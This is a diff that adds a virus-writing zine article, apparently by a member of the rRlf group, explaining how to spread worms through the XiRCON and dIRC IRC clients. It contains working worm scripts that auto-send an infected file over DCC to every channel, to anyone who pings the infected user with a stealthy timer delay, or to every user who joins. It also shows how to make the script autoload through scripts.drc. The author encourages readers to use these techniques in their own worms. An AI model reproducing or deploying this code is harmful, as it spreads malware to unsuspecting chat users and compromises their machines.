@@ -1,0 +1,195 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************          New IRC spreading           ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+ Index:
+ ******
+
+  0) Intro Words
+
+  1) XiRCON
+     a) Information about XiRCON
+     b) Spreading: The hard way
+     c) Spreading: The (more) silence way
+
+  2) dIRC
+     a) Information about dIRC
+     b) Spreading: One by one
+
+  3) Last words
+
+
+
+  0) Intro words
+
+  IRC (Internet Relay Chat) has been being a virus spreading field for years.
+  Nowadays there are three different programs, which allow virus spreading via
+  IRC. These are mIRC, pIRCh and vIRC. SnakeByte wrote an article about how
+  to spread viruses with these three programs some years ago (www.snake-basket.de).
+  But when I sat down and thought, why aren't there more programs, I got no
+  senseful answere, so I downloaded some programs, and tried to make a new
+  virus-script for them. And, as you may imagine, I had more than less some
+  successes. I wrote some scripts for some IRC clients, and added some information.
+  The result of my working is this article. :) Well, stop reading this intro
+  now, and learn, how to spread your virus/worm via other IRC clients.
+
+
+
+
+  1) XiRCON
+
+     a) Information about XiRCON
+
+        This is not a very common program, anyway, it's possible to write worms
+        for it, and therefore I decided to make such a worm. :) Well, you will find 
+        the program here: www.xirchon.com. XiRCON uses a complex syntax for it's scripts
+        and you're able to do really much with it. The auto-script is called 'Default.tcl',
+        and is directly in the XiRCON-directory (-programfiles-/XiRCON/ is the standart).
+        The standart scripts in there are nothing important, but nice to learn from :). OK,
+        the program is able to uses 24 different events, but unfortunatly there are no
+        directly 'join-user' event, so we have to do it in another way. But you will see....
+
+
+
+     b) Spreading: The hard way
+
+        You may wonder, what the topic is about, but you will see :). The infected user should
+        not recognize, that he/she is infected. OK, as I've already told you before, there is
+        no 'good' virus-event, so I thougth, it would be of some sense, to use the event
+        'CTCP', which is PING. Note: If the event already exists, you can't just add the same
+        again, because there would be an error. Therefore search in the whole script for a string
+        called 'on ctcp {'. If it exists, hook it, otherwise, add the new one. Well, the worm
+        script will be active, if any user pings you.
+        Now: what does it? It sends the infected file (here it is 'test.txt') to every nick
+        in every channel, where the infected user is. Now you know, why this is called 'hard way'.
+        Since every user gets a virus (also the OPs), the infected user will be kicked in some
+        channels (believe me, I tested it :D). Anyway, there will be many new infected people,
+        and so the worm did what we was expect to do. Now look at the source, and you'll under-
+        stand it.
+
+ - = - = - = - = - = - = - = - = - = - [XiRCON: The hard way] - = - = - = - = - = - = - = - = - = -
+on ctcp {
+  foreach n [channels] {
+    if {$n != [my_nick]} {
+      /dcc send $n test.txt
+    }
+  }
+}
+ - = - = - = - = - = - = - = - = - = - [XiRCON: The hard way] - = - = - = - = - = - = - = - = - = -
+
+
+
+     c) Spreading: The (more) silence way
+
+        At the first example the infected person will recognize that something smells fishy. So I
+        did it in another way, better, but not so fast. But in my opinion you should use this one
+        because the user don't know so fast, that he's infected. Well, this time I used two events:
+        'CTCP' again and (the new one) 'timer', which runs once time per second. It's behavior is the
+        following: A variable (called 'sent') is set to 1. Now somebody pings you, and the variable
+        will set to 0 and the nick of the PINGer is saved as 'sentto'. Now the fun begins in the
+        timer-event. The event checks, if sent!=1, and then it waits 1-30sec. After that it sends the
+        infected file to 'sentto'. Finishing the event, 'sent' is 1 again, and the whole is waiting
+        for the next ping :). Again: The two events must not be twice in a file. So look for the 
+        events and hook them (overwrite the code or just add it). Now, look at the source, and you
+        will understand, how to do this.
+
+ - = - = - = - = - = - = - = - = - = - [XiRCON: The (more) silence way] - = - = - = - = - = - = - = - = - = -
+set sent 1
+
+on ctcp {
+  set sent 0
+  set sentto [nick]
+}
+
+on timer {
+    set currTime [clock seconds]
+    if {([expr ($currTime - 15) % 30] == 0) && ($currTime != 15) && ($sent != 1)} { 
+       /dcc send $sentto test.txt
+       set sent 1
+    }
+}
+ - = - = - = - = - = - = - = - = - = - [XiRCON: The (more) silence way] - = - = - = - = - = - = - = - = - = -
+
+
+
+
+
+  2) dIRC
+
+     a) Information about dIRC
+
+        This is a funny, very colorful IRC client, which you can find here: http://www.dircchat.com.
+        The standart-directory is this one: -program-files-\Dragonmount Networks\dIRC.
+        dIRC uses just 12 different events and only 7 (!!!) variables. You may think that sucks but
+        a worm code don't need really much. Fortunatly this program has a 'join'-event, so it's quite
+        easier to write a IRC-worm for dIRC as for the XiRCON. Well, the program auto-loads a script
+        called 'standard.dsf' in the directory 'scripts'. The whole standart content (760 byte - wooow)
+        is completly bullshit :). The program has a script-editor, where it's easy to generate new
+        aliases or events. Hmm, well, I think that I said everything important...
+
+
+
+     b) Spreading: One by One
+
+        As I've already told you, dIRC has a 'join' event, which is executed every time when a user joins
+        a channel, and it returns the nickname of the person and the channel, where (s)he joined. OK, cool,
+        let's think: We have the nick of a person who joined a channel?? What to do? INFECT!!! :)
+        Look at the example. It's really easy to understand, and it's very(!!!) shourt (two lines). If you
+        want to use the technique, add the code to the 'standart.dsf' or make a new .dsf file in the script
+        directory as I did it. Don't forget the first (empty) line and the last line ('==='), since it's
+        dIRC syntax [cooool! :D]
+        NOTE: 'dIRC dcc send' automatically ignores '.exe' and '.vbs' files!
+
+ - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
+#commands
+#VBScript
+!!! Do not edit the contents of this file. !!!
+
+#EVENT# vir Join	*	*	on
+sendcommand "/dcc send " & Nick & " test.txt"
+===
+ - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
+
+        OK, now we have our script, which infects every user who joins to a channel. But we have also
+        load the script, otherwise it won't work. How to do this? In the dIRC-folder we'll find a
+        file called 'scripts.drc'. This file saves every script that becomes loaded. Here we have to add
+        a line with our script-file. Let's look at the hooked filecontent:
+
+ - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
+C:\Programme\Dragonmount Networks\dIRC\scripts\standard.dsf	commands	VBScript
+C:\Programme\Dragonmount Networks\dIRC\scripts\virus.dsf	commands	VBScript
+
+ - = - = - = - = - = - = - = - = - = - [dIRC: One by One] - = - = - = - = - = - = - = - = - = -
+
+        That should explain everthing. If you do all these things, your dIRC-worm will work...
+
+
+
+
+
+  3) Last words
+
+  Internet Relay Chat is a very successful way, how you can spread your viruses. And, as far as I
+  know, there are just 3 programs around, where we are able to make a worm for it. Well, as I thought
+  3 programs are too few. So I sat down, downloaded some programs, and made a worm for them. I hope you
+  like this article and you will use some of the techniques I told you in one of your next worms. :)
+  It would be cool if you could send me a mail, and tell me, what you think about this article.
+  I think I said everything important and you read everything important, so: Go on writing a cool virus
+  or worm. :D
+  A very big thanks goes to SlageHammer for helping me to test the codes.
+
+
+                                                        - - - - - - - - - - - - - - -
+                                                          Second Part To Hell/[rRlf]  
+                                                          www.spth.de.vu
+                                                          spth@aonmail.at
+                                                          written from dec 2003-january 2004
+                                                          Austria
+                                                        - - - - - - - - - - - - - - - 
